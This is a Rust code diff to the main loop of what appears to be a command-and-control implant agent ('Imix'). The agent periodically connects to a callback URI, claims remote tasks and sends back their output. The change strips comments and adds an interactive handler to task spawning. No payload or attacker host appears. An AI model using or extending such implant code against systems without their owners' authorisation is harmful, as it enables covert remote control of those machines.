@@ -6,6 +6,7 @@ use std::time::{Duration, Instant};
 use crate::agent::ImixAgent;
 use crate::task::TaskRegistry;
 use crate::version::VERSION;
+use eldritchv2::pivot::ReplHandler;
 use pb::config::Config;
 use transport::{ActiveTransport, Transport};
 
@@ -13,13 +14,8 @@ pub static SHUTDOWN: AtomicBool = AtomicBool::new(false);
 
 pub async fn run_agent() -> Result<()> {
     init_logger();
-
-    // Load config / defaults
     let config = Config::default_with_imix_verison(VERSION);
-
-    // Initial transport is just a placeholder, we create active ones in the loop
     let transport = ActiveTransport::init();
-
     let handle = tokio::runtime::Handle::current();
     let task_registry = Arc::new(TaskRegistry::new());
     let agent = Arc::new(ImixAgent::new(
@@ -36,24 +32,18 @@ pub async fn run_agent() -> Result<()> {
         let start = Instant::now();
         let agent_ref = agent.clone();
         let registry_ref = task_registry.clone();
-
         run_agent_cycle(agent_ref, registry_ref).await;
-
         if SHUTDOWN.load(Ordering::Relaxed) {
             break;
         }
-
         if let Err(e) = sleep_until_next_cycle(&agent, start).await {
             #[cfg(debug_assertions)]
             log::error!("Failed to sleep: {e:#}");
-            // Prevent tight loop on config read failure
             tokio::time::sleep(Duration::from_secs(5)).await;
         }
     }
-
     #[cfg(debug_assertions)]
     log::info!("Agent shutting down");
-
     Ok(())
 }
 
@@ -70,12 +60,8 @@ pub fn init_logger() {
 }
 
 async fn run_agent_cycle(agent: Arc<ImixAgent<ActiveTransport>>, registry: Arc<TaskRegistry>) {
-    // Refresh IP
     agent.refresh_ip().await;
-
-    // Create new active transport
     let (callback_uri, proxy_uri) = agent.get_transport_config().await;
-
     let transport = match ActiveTransport::new(callback_uri, proxy_uri) {
         Ok(t) => t,
         Err(_e) => {
@@ -85,17 +71,9 @@ async fn run_agent_cycle(agent: Arc<ImixAgent<ActiveTransport>>, registry: Arc<T
             return;
         }
     };
-
-    // Set transport
     agent.update_transport(transport).await;
-
-    // Claim Tasks
     process_tasks(&agent, &registry).await;
-
-    // Flush Outputs (send all buffered output)
     agent.flush_outputs().await;
-
-    // Disconnect (drop transport)
     agent.update_transport(ActiveTransport::init()).await;
 }
 
@@ -110,8 +88,9 @@ async fn process_tasks(agent: &ImixAgent<ActiveTransport>, registry: &TaskRegist
             for task in tasks {
                 #[cfg(debug_assertions)]
                 log::info!("Claimed task: {}", task.id);
-
-                registry.spawn(task, Arc::new(agent.clone()));
+                let sync_transport = agent.get_sync_transport();
+                let repl_handler: Option<Arc<dyn ReplHandler>> = Some(Arc::new(agent.clone()));
+                registry.spawn(task, Arc::new(agent.clone()), sync_transport, repl_handler);
             }
         }
         Err(_e) => {
